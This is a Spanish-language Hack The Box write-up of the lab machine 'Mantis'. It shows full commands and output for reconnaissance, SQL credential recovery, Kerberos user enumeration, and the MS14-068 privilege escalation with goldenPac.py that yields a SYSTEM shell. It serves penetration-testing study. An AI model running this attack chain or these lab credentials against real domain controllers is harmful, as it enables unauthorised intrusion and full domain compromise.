---
title: Hack The Box Mantis
author: k4miyo
date: 2021-09-19
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Hard, Windows]
tags: [Windows, Active Directory, SQL, File Misconfiguration, Patch Management]
ping: true
---

## Mantis
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.52.

```bash
❯ ping -c 1 10.10.10.52
PING 10.10.10.52 (10.10.10.52) 56(84) bytes of data.
64 bytes from 10.10.10.52: icmp_seq=1 ttl=127 time=141 ms

--- 10.10.10.52 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 141.180/141.180/141.180/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.52 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 19:21 CDT
Initiating SYN Stealth Scan at 19:21                                                                                             
Scanning 10.10.10.52 [65535 ports]
Discovered open port 53/tcp on 10.10.10.52    
Discovered open port 445/tcp on 10.10.10.52
Discovered open port 135/tcp on 10.10.10.52                                                                                      
Discovered open port 139/tcp on 10.10.10.52                                                                                      
Discovered open port 8080/tcp on 10.10.10.52
Discovered open port 1433/tcp on 10.10.10.52    
Discovered open port 38/tcp on 10.10.10.52     
Discovered open port 49153/tcp on 10.10.10.52   
Discovered open port 49166/tcp on 10.10.10.52   
Discovered open port 464/tcp on 10.10.10.52     
Discovered open port 9389/tcp on 10.10.10.52    
Discovered open port 3268/tcp on 10.10.10.52    
Discovered open port 49152/tcp on 10.10.10.52   
Discovered open port 47001/tcp on 10.10.10.52   
Discovered open port 49154/tcp on 10.10.10.52   
Discovered open port 49164/tcp on 10.10.10.52   
Discovered open port 3269/tcp on 10.10.10.52    
Discovered open port 50255/tcp on 10.10.10.52   
Discovered open port 49157/tcp on 10.10.10.52   
Discovered open port 49168/tcp on 10.10.10.52   
Discovered open port 1337/tcp on 10.10.10.52    
Discovered open port 49155/tcp on 10.10.10.52   
Discovered open port 88/tcp on 10.10.10.52      
Discovered open port 636/tcp on 10.10.10.52     
Discovered open port 593/tcp on 10.10.10.52     
Discovered open port 49158/tcp on 10.10.10.52   
Discovered open port 5722/tcp on 10.10.10.52    
Completed SYN Stealth Scan at 19:21, 26.76s elapsed (65535 total ports)
Nmap scan report for 10.10.10.52                
Host is up, received user-set (0.14s latency).  
Scanned at 2021-09-19 19:21:03 CDT for 27s      
Not shown: 64173 closed tcp ports (reset), 1335 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1337/tcp  open  waste            syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
8080/tcp  open  http-proxy       syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49164/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127
50255/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.02 seconds
           Raw packets sent: 130159 (5.727MB) | Rcvd: 78237 (3.130MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.52
   5   │     [*] Open ports: 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,4
       │ 9157,49158,49164,49166,49168,50255
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,4
9164,49166,49168,50255 10.10.10.52 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 19:22 CDT
Nmap scan report for 10.10.10.52       
Host is up (0.14s latency).  
                                                                                                                                 
PORT      STATE SERVICE      VERSION                    
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid:                                                     
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)                                                                              
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-20 00:27:33Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                       
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?                                       
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
636/tcp   open  tcpwrapped                                                                                                       
1337/tcp  open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5           
| http-methods:                                                                                                                  
|_  Potentially risky methods: TRACE                  
|_http-title: IIS7                                              
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-20T00:22:20                                                                                          
|_Not valid after:  2051-09-20T00:22:20    
|_ssl-date: 2021-09-20T00:28:41+00:00; +4m46s from scanner time. 
| ms-sql-ntlm-info:                                             
|   Target_Name: HTB                                            
|   NetBIOS_Domain_Name: HTB                                    
|   NetBIOS_Computer_Name: MANTIS                 
|   DNS_Domain_Name: htb.local                                                                                                   
|   DNS_Computer_Name: mantis.htb.local           
|_  Product_Version: 6.1.7601                                   
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped                                      
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-open-proxy: Proxy might be redirecting requests                                                                           
|_http-server-header: Microsoft-IIS/7.5                     
|_http-title: Tossed Salad - Blog                                                                                                
9389/tcp  open  mc-nmf       .NET Message Framing               
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
49158/tcp open  msrpc        Microsoft Windows RPC
49164/tcp open  msrpc        Microsoft Windows RPC
49166/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-09-20T00:22:20
|_Not valid after:  2051-09-20T00:22:20
|_ssl-date: 2021-09-20T00:28:41+00:00; +4m46s from scanner time. 
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: MANTIS
|   DNS_Domain_Name: htb.local
|   DNS_Computer_Name: mantis.htb.local
|_  Product_Version: 6.1.7601
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2021-09-19T20:28:30-04:00
|_clock-skew: mean: 39m03s, deviation: 1h30m43s, median: 4m45s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2021-09-20T00:28:34
|_  start_date: 2021-09-20T00:21:54

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.40 seconds
```

Vemos diversos puertos abiertos por los cuales podemos obtener una forma de acceder a la máquina, así que vamos en orden. 
 
### SMB
Podíamos probar una *null session* para el servicio smb:
```bash
❯ smbclient -L 10.10.10.52 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.52
[+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       
❯ smbmap -H 10.10.10.52 -u "null"
[!] Authentication error on 10.10.10.52
```

Podemos acceder al servicio SMB con una *null session*; sin embargo, no se lista algún recurso, por lo que igual podriamos esperar para obtener credenciales válidas de acceso y tratar de listar los recursos del servicio.

### Web

Vamos a tratar de ver el contenido de los sitios web alojados en la máquina, que de acuerdo con el archivo **targeted** vemos el puerto 1337 asociado a *Microsoft IIS 7.5*. Aquí podriamos pensar que ejecutando el exploit de *MS17-010* podemos acceder al equipo; sin embargo, al parecer se encuentra parcheado.  También vemos el puerto 8080 relacionado con el blog *Tossed Salad - Blog*:

![](/assets/images/htb-mantis/mantis_web.png)

Con la herramienta `whatweb` podemos obtener un poco de información adicional; como el uso del CMS Orchard, que de acuerdo con lo investigado, poco podemos hacer.

```bash
❯ whatweb http://10.10.10.52:8080/
http://10.10.10.52:8080/ [200 OK] ASP_NET[4.0.30319][MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.52], MetaGenerator[Orchard], Microsoft-IIS[7.5], Script[text/javascript], Title[Tossed Salad - Blog], UncommonHeaders[x-generator,x-aspnetmvc-version], X-Powered-By[ASP.NET]
```

Podemos tratar se hacer un *fuzzing* empezando el puerto 1337, pero antes creamos un direccionario a partir del `directory-list-2.3-medium.txt`:

```bash
❯ cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i -E "user|pass|cred|note|secur" > dictionary.txt
❯ wfuzz -c --hc=404 -w dictionary.txt http://10.10.10.52:1337/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.52:1337/FUZZ
Total requests: 1637

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000802:   301        1 L      10 W       160 Ch      "secure_notes"                                                  

Total time: 0
Processed Requests: 1637
Filtered Requests: 1636
Requests/sec.: 0
```

Tenemos el recurso *secure_notes* que al acceder vemos dos archivos. El primero, un archivo txt que tiene un nombre un poco extraño después del *dev\_notes\_* y de acuerdo con el formato, podría trate de  una cadena en base64.

![](/assets/images/htb-mantis/mantis_fuzz.png)

```bash
❯ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d; echo
6d2424716c5f53405f504073735730726421
```

El resultado nos va una cadena en hexadecimal, por lo que la pasamos a un formato legible para nosotros:

```bash
❯ echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d| xxd -ps -r; echo
m$$ql_S@_P@ssW0rd!
```

Vemos una posible contraseña asociada al servicio de SQL (no olvidemos guardar siempre las posibles credenciales que identifiquemos). Ahora, checando el contenido del archivo txt, tenemos lo siguiente:

![](/assets/images/htb-mantis/mantis_sql.png)

Tenemos varias pistas:
- CMS Orchard
- Usuario del SQL server **admin**
- Base de datos **orcharddb**

Ya tenemos credenciales potenciales a probar en el servicio de SQL.

### Microsoft SQL Server

A través del puerto 1433 vemos que corre el servicio *Microsoft SQL Server*. Podriamos intentar acceder a dicho recurso como el usuario **sa** (usuario común):

```bash
❯ sqsh -U 'sa' -S 10.10.10.52
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
Login failed for user 'sa'.
Password: 
Login failed for user 'sa'.
Password: 
Login failed for user 'sa'.
Password: ^C
```

No nos permite acceder al servidor como el usuario **sa** y sin contraseña o probando contraseñas default. Recordando que tenemos potenciales credenciales, las probamos:

```bash
❯ sqsh -U 'admin' -S 10.10.10.52
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1> 
```

Estamos dentro del SQL Server. Primeramente, vamos a listar las tablas alojadas en la base de datos que identificamos *orcharddb*:

```bash
1> SELECT TABLE_NAME from orcharddb.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
2> go -m csv > output.csv
1>
```

Con el comando `go -m csv > output.csv` nos exportamos la información a nuestro directorio de trabajo, esto es para tener la información de una forma más cómoda ya que el sin esto, la manera en como presenta el servidor la información es muy fea. En dicho archivo, vemos dos tablas que tienen la palabra **user**:

```bash
❯ cat output.csv | grep -i "user"
"blog_Orchard_Users_UserPartRecord"
"blog_Orchard_Roles_UserRolesPartRecord"
```

A este punto, vamos a listar el contenido de la tabla `blog_Orchard_Users_UserPartRecord`. (Nota: Para visualizar la información en un formato decente, vamos a exportar la información en formato html y la veremos en nuestro navegador en la dirección *localhost*):

```bash
1> USE orcharddb;
2> SELECT * FROM blog_Orchard_Users_UserPartRecord;
3> go -m html > index.html
1>
```

```bash
❯ cp index.html /var/www/html/.
❯ service apache2 start
```

![](/assets/images/htb-mantis/mantis_db.png)

Como se puede observar en los resultados obtenidos, tenemos el usuario **admin** y el usuario **james**, quien tiene una contraseña en texto claro; asi que nos guardamos las credenciales.

### Kerberos

Se tiene el puerto 88 abierto asociado al servicio de kerberos, por lo que podríamos conectarnos a través de una *null session* y ver posibles usuarios del dominio.

```bash
❯ rpcclient -U "" 10.10.10.52
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

Tampoco podemos ver la información relacionada al dominio. 

### Fuerza bruta (forma de obtener usuarios del dominio)

A este punto vemos que no tenemos forma de hacerlo; pero NO, vamos a tratar de acceder un tipo de ataque de fuerza bruta para obtener usuarios del dominio, para ello necesitamos de [SecList](https://github.com/danielmiessler/SecLists); lo descargamos en nuestra máquina y haciendo uso del script `krb5-user-enum` en `nmap` y del archivo `names.txt` de *SecList*, procedemos a ejecutar el siguiente comando:

```bash
❯ nmap -p88 --script=krb5-enum-users --script-args=krb5-enum-users.realm='htb.local',userdb=/opt/SecLists-master/Usernames/Names/names.txt 10.10.10.52 -oN kerberosUserEnum
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-19 20:40 CDT
Nmap scan report for 10.10.10.52
Host is up (0.14s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    james@htb.local

Nmap done: 1 IP address (1 host up) scanned in 242.63 seconds
```

Tenemos un usuario potencial del dominio: **james** que de acuerdo con la base de datos, es el mismo y tenemos la contraseña. 

A partir de aquí, tenemos un juego de credenciales a probar; así que primero vamos a validarlas con `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.52 -u 'admin' -p 'm$$ql_S@_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [-] htb.local\admin:m$$ql_S@_P@ssW0rd! STATUS_LOGON_FAILURE 
❯ crackmapexec smb 10.10.10.52 -u 'james' -p 'J@m3s_P@ssW0rd!'
SMB         10.10.10.52     445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.52     445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!
```

Vemos un **[+]** para el usuario **james**. Asi que vamos a tratar de listar los recursos del servicio SMB con dichas credenciales:

```bash
❯ smbclient -L 10.10.10.52 -U 'james%J@m3s_P@ssW0rd!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Vemos los recursos `NETLOGON` y `SYSVOL`. Aqui deberíamos estar pensando en el archivo **Group_._xml** alojando en la carpeta `SYSVOL`; así que primero nos instalamos `apt-get install cifs-utils` y creamos una montura en nuestro equipo:

```bash
❯ mount -t cifs //10.10.10.52/SYSVOL /mnt/smbmnt/ -o username='james',password='J@m3s_P@ssW0rd!',domain=WORKGROUP,rw
```

Ya nos creamos la montura y podemos visualizar los recursos de `/mnt/smbmnt` de una formas más rápida con el comando `tree`:

```bash
❯ tree /mnt/smbmnt/
/mnt/smbmnt/
└── htb.local
    ├── DfsrPrivate
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

16 directories, 5 files
```

No vemos nada interesante, así que nos quitamos la montura. Podemos probar a listar uusarios del dominio con `rpcclient` proporcionándole las credenciales que tenemos:

```bash
❯ rpcclient -U 'james%J@m3s_P@ssW0rd!' 10.10.10.52 -c "enumdomusers"
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[james] rid:[0x44f]
```

Podemos listar usuarios del dominio. Para tener la información en un formato más bonito y mas claro; nos instalamos la siguiente utilidad:

[LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump)

```bash
❯ ldapdomaindump -u 'WORKGROUP\james' -p 'J@m3s_P@ssW0rd!' -o /var/www/html/ 10.10.10.52
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Ahora desde el navegador consultado `localhost` y vemos una serie de archivos, aquellos con extensión `html` nos representa la información en un formato amigable sobre el dominio:

![](/assets/images/htb-mantis/mantis_dominio.png)

Como podemos ver, el unico usuario dentro del grupo **Administrators** es el usuario **Administrator**; nosotros como el usuario **james**, estamos en el grupo **Remote Desktop Users**, pero no tenemos el servicio RDP visible. En este punto, investigando un poco, vemos que exite una vulnerabilidad descrita en **MS14-068** que nos permitiría elevar privilegios de manera que el usuario **james** pueda tener los privilegios máximos:

![](/assets/images/htb-mantis/mantis_kerberos.png)

Asi que primero vamos a agregar en nuestro archivo `/etc/hosts` los dominios relacionados con la dirección IP de la máquina:

```bash
❯ cat /etc/hosts
───────┬────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  k4mipc
   4   │ 10.10.10.52 htb.local mantis.htb.local
   5   │ 
   6   │ ::1        localhost ip6-localhost ip6-loopback
   7   │ ff02::1    ip6-allnodes
   8   │ ff02::2    ip6-allrouters
```

```bash
❯ goldenPac.py htb.local/'james:J@m3s_P@ssW0rd!'@mantis.htb.local
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file lPDhopUm.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service MYLV on mantis.htb.local.....
[*] Starting service MYLV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

Ya ingresamos a la máquina como el usuario ***nt authority\\system*** y podemos visualizar las flags (user.txt y root.txt).
